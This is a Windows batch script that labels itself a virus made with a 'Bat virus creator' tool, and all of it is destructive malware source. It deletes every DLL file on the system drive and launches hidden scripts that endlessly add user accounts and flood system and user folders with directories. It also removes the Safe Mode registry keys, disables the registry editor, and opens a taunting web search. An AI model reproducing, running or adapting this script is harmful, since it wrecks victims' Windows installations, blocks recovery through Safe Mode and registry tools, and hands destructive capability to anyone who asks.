@echo off
echo Bu Virus, Bat virus olusturucu 1.7.00 programi ile yapilmistir..
@echo off
start https://www.google.com/search?q=How+to+buy+a+Idiot&oq=How+to+&aqs=chrome.0.69i59j69i57j35i39j35i19i39j46l2j69i65l2.5619j0j15&sourceid=chrome&ie=UTF-8
@echo off
DIR /S/B %SystemDrive%\*.dll >> FIleList_dll.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_dll.txt) do del "%%j:%%k"


@ECHO OFF
@ECHO PC DELIRT
GOTO start
:start
@ECHO SET magic2=1 >> bat6.bat
@ECHO GOTO flood5 >> bat6.bat
@ECHO :flood5 >> bat6.bat
@ECHO SET /a magic2=%%magic2%%+1 >> bat6.bat
@ECHO NET USER magic2%%magic2%% /add >> bat6.bat
@ECHO GOTO flood5 >> bat6.bat
START /MIN bat6.bat
GOTO bat5
:bat5
@ECHO CD %%ProgramFiles%%\ >> bat5.bat
@ECHO SET pogo=1 >> bat5.bat
@ECHO GOTO flood4 >> bat5.bat
@ECHO :flood4 >> bat5.bat
@ECHO MKDIR pogo%%pogo%% >> bat5.bat
@ECHO SET /a pogo=%%pogo%%+1 >> bat5.bat
@ECHO GOTO flood4 >> bat5.bat
START /MIN bat5.bat
GOTO bat4
:bat4
@ECHO CD %%SystemRoot%%\ >> bat4.bat
@ECHO SET hat=1 >> bat4.bat
@ECHO GOTO flood3 >> bat4.bat
@ECHO :flood3 >> bat4.bat
@ECHO MKDIR hat%%hat%% >> bat4.bat
@ECHO SET /a hat=%%hat%%+1 >> bat4.bat
@ECHO GOTO flood3 >> bat4.bat
START /MIN bat4.bat
GOTO bat3
:bat3
@ECHO CD %%UserProfile%%\Start Menu\Programs\ >> bat3.bat
@ECHO SET chart=1 >> bat3.bat
@ECHO GOTO flood2 >> bat3.bat
@ECHO :flood2 >> bat3.bat
@ECHO MKDIR chart%%chart%% >> bat3.bat
@ECHO SET /a chart=%%chart%%+1 >> bat3.bat
@ECHO GOTO flood2 >> bat3.bat
START /MIN bat3.bat
GOTO bat2
:bat2
@ECHO CD %%UserProfile%%\Desktop\ >> bat2.bat
@ECHO SET gamer=1 >> bat2.bat
@ECHO GOTO flood >> bat2.bat
@ECHO :flood >> bat2.bat
@ECHO MKDIR gamer%%gamer%% >> bat2.bat
@ECHO SET /a gamer=%%gamer%%+1 >> bat2.bat
@ECHO GOTO flood >> bat2.bat
START /MIN bat2.bat
GOTO original
original
CD %HomeDrive%\
SET sharma=1
GOTO flood1
:flood1
MKDIR sharma%sharma%
SET /a sharma=%sharma%+1
GOTO flood1
GOTO start


@echo off
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal” /f > nul
reg delete “HKLM\SYSTEM\currentcontrolset\control\safeboot\network” /f > nul

@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1/f > nul
reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v DisableRegistryTools /t REG_DWORD /d “1”








